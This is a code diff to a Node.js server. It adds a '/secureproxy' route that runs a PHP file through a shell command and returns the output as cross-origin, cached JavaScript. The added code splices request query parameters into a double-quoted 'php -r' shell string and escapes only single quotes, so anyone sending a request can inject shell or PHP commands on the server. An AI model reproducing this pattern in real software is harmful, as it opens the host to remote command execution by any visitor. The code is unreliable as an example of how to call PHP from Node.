@@ -278,18 +278,87 @@ const server = http.createServer((req, res) => {
     return;
   }
 
-  // Secureproxy route - handle PHP file execution via HTTP request to self
-  // Since PHP execution from Node.js is complex, we'll let nginx handle it
-  // by not intercepting this route - nginx will process it via php-fpm
+  // Secureproxy route - handle PHP file execution
+  // Use simple approach: proxy request to PHP file via HTTP
   if (pathname.startsWith('/secureproxy')) {
-    // Don't handle here - let nginx process it
-    // This route should be handled by nginx before reaching Node.js
-    // If we reach here, nginx is not configured for PHP
-    res.writeHead(404, { 
-      'Content-Type': 'application/javascript',
-      'Access-Control-Allow-Origin': '*'
+    const phpFile = path.join(__dirname, 'vC-eQxIe.php');
+    
+    if (!fs.existsSync(phpFile)) {
+      res.writeHead(404, { 
+        'Content-Type': 'application/javascript',
+        'Access-Control-Allow-Origin': '*'
+      });
+      res.end('// Secureproxy file not found');
+      return;
+    }
+    
+    // Use simple exec with query string passed as environment variable
+    const { exec } = require('child_process');
+    const queryString = url.search || '';
+    const queryStringClean = queryString.replace(/^\?/, '');
+    
+    // Parse query string and set as $_GET in PHP
+    const queryParams = new URLSearchParams(queryString);
+    let phpCode = '';
+    
+    // Build PHP code to set $_GET parameters
+    queryParams.forEach((value, key) => {
+      const safeKey = key.replace(/'/g, "\\'");
+      const safeValue = value.replace(/'/g, "\\'");
+      phpCode += `$_GET['${safeKey}'] = '${safeValue}'; `;
     });
-    res.end('// Secureproxy not configured - nginx should handle PHP');
+    
+    // Build PHP command - set $_GET then include file
+    const phpCommand = phpCode 
+      ? `php -r "${phpCode} require '${phpFile.replace(/\\/g, '/')}';"`
+      : `php "${phpFile}"`;
+    
+    exec(phpCommand, { 
+      timeout: 10000,
+      maxBuffer: 1024 * 1024 * 10,
+      env: {
+        ...process.env,
+        QUERY_STRING: queryStringClean,
+        REQUEST_METHOD: 'GET'
+      }
+    }, (error, stdout, stderr) => {
+      if (error) {
+        console.error('[SERVER] PHP execution error:', error.message);
+        if (!res.headersSent) {
+          res.writeHead(500, { 
+            'Content-Type': 'application/javascript',
+            'Access-Control-Allow-Origin': '*'
+          });
+          res.end('// PHP execution error');
+        }
+        return;
+      }
+      
+      const output = stdout || '';
+      
+      // Check if output is HTML (error page)
+      if (output.trim().startsWith('<?php') || output.trim().startsWith('<!')) {
+        console.error('[SERVER] PHP returned HTML instead of JS');
+        if (!res.headersSent) {
+          res.writeHead(500, { 
+            'Content-Type': 'application/javascript',
+            'Access-Control-Allow-Origin': '*'
+          });
+          res.end('// PHP execution error: returned HTML');
+        }
+        return;
+      }
+      
+      if (!res.headersSent) {
+        res.writeHead(200, {
+          'Content-Type': 'application/javascript',
+          'Access-Control-Allow-Origin': '*',
+          'Cache-Control': 'public, max-age=3600'
+        });
+        res.end(output);
+      }
+    });
+    
     return;
   }
 
